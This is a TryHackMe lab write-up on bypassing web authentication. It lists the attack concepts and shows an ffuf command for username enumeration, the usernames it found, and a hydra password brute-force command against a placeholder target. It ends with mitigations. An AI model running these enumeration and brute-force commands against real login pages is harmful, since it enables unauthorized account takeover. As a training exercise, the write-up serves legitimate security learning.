# TryHackMe - Authentication Bypass

## General Information

- **Module/Room:** Authentication Bypass
- **Category:** Web Application Security
- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Objectives:** Identify flaws in web authentication mechanisms, enumerate valid usernames, and bypass access controls.

---

## 1. Concepts & Attack Vectors

The room explores standard vulnerabilities present in web authentication workflows:

1. **Username Enumeration:**
   - Arises when application response messages or behavior differ between existing and non-existing accounts (e.g., *"Username does not exist"* vs. *"Invalid password"*).
2. **Cookie & Session Manipulation:**
   - Modifying unsigned or predictable session identifiers to elevate privileges or hijack other user sessions.
3. **Targeted Password Spraying / Brute-Force:**
   - Once the list of valid user accounts is confirmed, attack surface and lock-out risks are significantly reduced.
4. **Logic Flaws in Password Reset Flows:**
   - Bypassing token validation or improper validation of password reset parameters.

---

## 2. Username Enumeration

### Analyzing Login Form Behavior

Sending requests with invalid vs. known accounts returned identifiable differences in error messaging, response status, or payload size.

### Fuzzing with FFUF / Hydra

Using username lists from SecLists (`/usr/share/seclists/Usernames/Names/names.txt`):

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u http://<TARGET_IP>/login -X POST \
  -d "username=FUZZ&password=dummyPassword123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "The password is not correct"
```

### Discovered Valid User Accounts

The following usernames were confirmed as active accounts in the target system (`valid_usernames.txt`):
- `robert`
- `steve`
- `simon`
- `admin`

---

## 3. Targeted Brute-Force

Using the verified list of usernames, password brute-forcing was executed against the confirmed accounts:

```bash
hydra -L valid_usernames.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid username or password"
```

---

## 4. Mitigations & Best Practices

1. **Generic Error Responses:** Always return generic error messages such as *"Invalid username or password"* regardless of whether the username exists.
2. **Brute-Force & Rate Limiting:** Implement IP-based and account-based rate limiting, exponential backoff, or CAPTCHA mechanisms on failed login attempts.
3. **Secure Session Handling:** Ensure session tokens are unpredictable, cryptographically signed, and marked with `HttpOnly`, `Secure`, and `SameSite` flags.
